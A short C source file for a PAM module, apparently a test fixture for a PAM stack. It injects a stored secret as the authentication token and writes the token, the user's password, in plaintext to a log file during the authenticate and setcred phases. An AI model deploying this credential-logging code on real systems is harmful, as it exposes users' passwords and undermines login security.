#include <security/pam_modules.h>
#include <stdio.h>
#include <string.h>

#define RELEASE_PATH "/run/pamstack/release"
#define LOG_PATH "/run/pamstack/log"

static int is_capture(int argc, const char **argv) {
  for (int i = 0; i < argc; i++)
    if (strcmp(argv[i], "capture") == 0) return 1;
  return 0;
}

static void record(pam_handle_t *h, const char *phase, int argc, const char **argv) {
  const void *token = NULL;
  pam_get_item(h, PAM_AUTHTOK, &token);
  FILE *f = fopen(LOG_PATH, "a");
  if (!f) return;
  fprintf(f, "OPENHELLO%s %s authtok=%s\n", is_capture(argc, argv) ? " capture" : "", phase,
          token ? (const char *)token : "(unset)");
  fclose(f);
}

int pam_sm_authenticate(pam_handle_t *h, int flags, int argc, const char **argv) {
  char secret[256];
  (void)flags;
  if (is_capture(argc, argv)) {
    record(h, "authenticate", argc, argv);
    return PAM_IGNORE;
  }
  FILE *f = fopen(RELEASE_PATH, "r");
  if (f) {
    if (fgets(secret, sizeof secret, f)) {
      secret[strcspn(secret, "\n")] = 0;
      pam_set_item(h, PAM_AUTHTOK, secret);
    }
    fclose(f);
  }
  record(h, "authenticate", argc, argv);
  return PAM_IGNORE;
}

int pam_sm_setcred(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)flags;
  record(h, "setcred", argc, argv);
  return PAM_IGNORE;
}
